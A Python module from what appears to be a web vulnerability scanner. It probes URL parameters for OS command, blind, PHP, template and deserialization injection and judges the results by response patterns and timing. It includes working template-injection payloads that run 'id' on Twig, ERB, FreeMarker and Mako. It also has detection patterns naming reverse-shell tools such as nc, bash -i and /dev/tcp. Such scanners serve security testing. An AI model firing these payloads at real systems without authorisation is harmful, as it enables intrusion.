import logging
import httpx
import asyncio
import re
import time
import json
import uuid
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from backend.api.websocket import emit_finding, emit_tool_output

logger = logging.getLogger(__name__)

CMD_EXEC_PATTERNS = [
    r"uid=\d+",
    r"gid=\d+",
    r"root:",
    r"daemon:",
    r"bin:",
    r"sys:",
    r"\[boot loader\]",
    r"\[operating systems\]",
    r"Windows IP Configuration",
    r"phpinfo\(\)",
    r"\[internetserverapi\]",
    r"Linux version \d",
    r"Darwin Kernel",
    r"FreeBSD",
    r"NetBSD",
    r"OpenBSD",
    r"CYGWIN",
    r"Microsoft Windows \[Version",
]

BLIND_CMD_PATTERNS = [
    r"ping.*?-c\s+\d+",
    r"nslookup",
    r"dig\s+",
    r"host\s+",
    r"curl\s+",
    r"wget\s+",
    r"nc\s+-",
    r"bash\s+-i",
    r"/dev/tcp/",
]

PHP_CODE_PATTERNS = [
    r"PHP Warning",
    r"PHP Fatal error",
    r"PHP Parse error",
    r"phpinfo\(\)",
    r"PHP Version",
    r"php_uname",
    r"phpinfo",
    r"\$_SERVER",
    r"\$_GET",
    r"\$_POST",
    r"\$_REQUEST",
]

SSTI_PATTERNS = {
    "jinja2": [
        r"49",
        r"1024",
        r"<Config",
        r"UndefinedError",
        r"jinja2\.exceptions",
        r"Undefined",
        r"TemplateRuntimeError",
    ],
    "twig": [
        r"Twig",
        r"Markup",
        r"Twig\\Error",
        r"twig\.templates",
    ],
    "erb": [
        r"ERB",
        r"RuntimeError",
        r"NoMethodError",
        r"\(eval\)",
    ],
    "freemarker": [
        r"FreeMarker",
        r"freemarker\.template",
        r"No such macro",
        r"TemplateException",
    ],
    "mako": [
        r"Mako",
        r"mako\.exceptions",
        r"SyntaxException",
        r"NameError",
    ],
    "generic": [
        r"49",
        r"1024",
        r"125",
        r"81",
        r"config",
    ],
}

DESEREALIZATION_PATTERNS = [
    r"O:",
    r"a:",
    r"s:\d+:",
    r"r:\d+;",
    r"Exception",
    r"unserialize",
    r"readObject",
    r"ObjectInputStream",
    r"pickle",
    r"marshal",
    r"yaml\.load",
    r"yaml\.unsafe_load",
]

SSTI_EXPRESSIONS = {
    "jinja2": ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self.__class__.__mro__}}"],
    "twig": ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
    "erb": ["<%= 7*7 %>", "<%= system('id') %>"],
    "freemarker": ["${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"],
    "mako": ["${7*7}", "<% import os %>${os.popen('id').read()}"],
}


class CommandInjectionScanner:
    def __init__(self, timeout: int = 30, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self._findings = []

    async def scan(self, element: dict, payloads: list[dict]) -> list[dict]:
        findings = []
        url = element.get("url", "")
        param_name = element.get("parameter_name", "")
        method = element.get("http_method", "GET").upper()
        scan_id = element.get("scan_id", "")

        if not url or not param_name:
            return findings

        try:
            baseline = await self._get_baseline(url, method, param_name)
        except Exception as e:
            logger.error(f"CMD injection baseline failed for {url}: {e}")
            return findings

        for payload in payloads:
            subtype = payload.get("subtype", "os_command")
            payload_str = payload.get("payload_string", "")

            if subtype == "os_command":
                result = await self._test_os_command(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "blind_command":
                result = await self._test_blind_command(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "php_code":
                result = await self._test_php_code(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "ssti":
                result = await self._test_ssti(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "deserialization":
                result = await self._test_deserialization(
                    url, method, param_name, payload_str, baseline
                )
            else:
                result = await self._test_os_command(
                    url, method, param_name, payload_str, baseline
                )

            if result:
                findings.append(result)

        self._findings = findings
        return findings

    async def _get_baseline(self, url: str, method: str, param_name: str) -> dict:
        start = time.time()
        async with httpx.AsyncClient(
            verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
        ) as client:
            if method == "GET":
                resp = await client.get(url)
            else:
                resp = await client.post(url, data={param_name: "baseline"})
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "body": resp.text,
                "body_length": len(resp.text),
                "response_time": elapsed,
                "headers": dict(resp.headers),
            }

    async def _send_payload(
        self, url: str, method: str, param_name: str, payload: str
    ) -> dict:
        start = time.time()
        try:
            async with httpx.AsyncClient(
                verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
            ) as client:
                if method == "GET":
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    inject_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment,
                    ))
                    resp = await client.get(inject_url)
                else:
                    resp = await client.post(url, data={param_name: payload})
                elapsed = time.time() - start
                return {
                    "status_code": resp.status_code,
                    "body": resp.text,
                    "body_length": len(resp.text),
                    "response_time": elapsed,
                    "headers": dict(resp.headers),
                    "error": None,
                }
        except httpx.TimeoutException:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": str(e)}

    def _create_finding(
        self, title: str, description: str, severity: str, cvss: float,
        confidence: str, family: str, subtype: str, payload: str,
        request_data: dict, response_data: dict, evidence: dict
    ) -> dict:
        return {
            "id": str(uuid.uuid4()),
            "title": title,
            "description": description,
            "severity": severity,
            "cvss_score": cvss,
            "confidence": confidence,
            "injection_family": family,
            "injection_subtype": subtype,
            "payload": payload,
            "request_data": request_data,
            "response_data": response_data,
            "evidence_json": json.dumps(evidence),
        }

    def _match_patterns(self, body: str, patterns: list[str]) -> list[str]:
        matches = []
        body_lower = body.lower()
        for pattern in patterns:
            if re.search(pattern, body_lower, re.IGNORECASE):
                matches.append(pattern)
        return matches

    async def _test_os_command(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, CMD_EXEC_PATTERNS)

        if matches:
            return self._create_finding(
                title="Command Injection - OS Command",
                description=f"OS command injection detected. Command execution evidence found via patterns: {', '.join(matches[:3])}",
                severity="critical",
                cvss=10.0,
                confidence="high",
                family="command_injection",
                subtype="os_command",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={"matched_patterns": matches[:5]},
            )

        if resp["status_code"] != baseline["status_code"] and resp["status_code"] == 200:
            return self._create_finding(
                title="Command Injection - OS Command (Status Change)",
                description="Status code changed to 200 after command injection payload.",
                severity="high",
                cvss=8.6,
                confidence="medium",
                family="command_injection",
                subtype="os_command",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "baseline_status": baseline["status_code"]},
                evidence={"status_change": True},
            )
        return None

    async def _test_blind_command(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            if "timeout" in resp.get("error", "").lower():
                return self._create_finding(
                    title="Command Injection - Blind",
                    description="Blind command injection detected. Payload caused timeout indicating time-based execution.",
                    severity="critical",
                    cvss=9.8,
                    confidence="high",
                    family="command_injection",
                    subtype="blind_command",
                    payload=payload,
                    request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                    response_data={"response_time": resp["response_time"]},
                    evidence={"timeout": True},
                )
            return None

        response_time = resp["response_time"]
        baseline_time = baseline["response_time"]
        time_ratio = response_time / max(baseline_time, 0.001)

        if time_ratio > 3.0 and response_time - baseline_time > 2.0:
            return self._create_finding(
                title="Command Injection - Blind (Time-Based)",
                description=f"Blind command injection detected. Response time {time_ratio:.1f}x slower than baseline.",
                severity="critical",
                cvss=9.8,
                confidence="high",
                family="command_injection",
                subtype="blind_command",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"response_time": response_time, "baseline_time": baseline_time},
                evidence={"time_ratio": time_ratio},
            )
        return None

    async def _test_php_code(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, PHP_CODE_PATTERNS)

        if matches:
            return self._create_finding(
                title="Command Injection - PHP Code",
                description=f"PHP code injection detected. PHP errors/info leaked: {', '.join(matches[:3])}",
                severity="critical",
                cvss=9.8,
                confidence="high",
                family="command_injection",
                subtype="php_code",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={"matched_patterns": matches[:5]},
            )
        return None

    async def _test_ssti(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        for engine, patterns in SSTI_PATTERNS.items():
            matches = self._match_patterns(body, patterns)
            if matches:
                return self._create_finding(
                    title=f"Command Injection - SSTI ({engine.title()})",
                    description=f"Server-Side Template Injection detected for {engine}. Evidence: {', '.join(matches[:3])}",
                    severity="critical",
                    cvss=9.8,
                    confidence="high" if engine != "generic" else "medium",
                    family="command_injection",
                    subtype="ssti",
                    payload=payload,
                    request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                    response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                    evidence={"engine": engine, "matched_patterns": matches[:3]},
                )

        if payload in body and any(c in payload for c in ["{{", "}}", "<%", "%>", "${", "}"]):
            return self._create_finding(
                title="Command Injection - SSTI (Reflection)",
                description="Potential SSTI. Template syntax reflected in response without evaluation.",
                severity="high",
                cvss=8.6,
                confidence="medium",
                family="command_injection",
                subtype="ssti",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"payload_reflected": True},
            )
        return None

    async def _test_deserialization(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, DESEREALIZATION_PATTERNS)

        if matches and resp["status_code"] != baseline["status_code"]:
            return self._create_finding(
                title="Command Injection - Deserialization",
                description=f"Deserialization vulnerability detected. Error patterns: {', '.join(matches[:3])}",
                severity="critical",
                cvss=9.8,
                confidence="medium",
                family="command_injection",
                subtype="deserialization",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"matched_patterns": matches[:5]},
            )
        return None
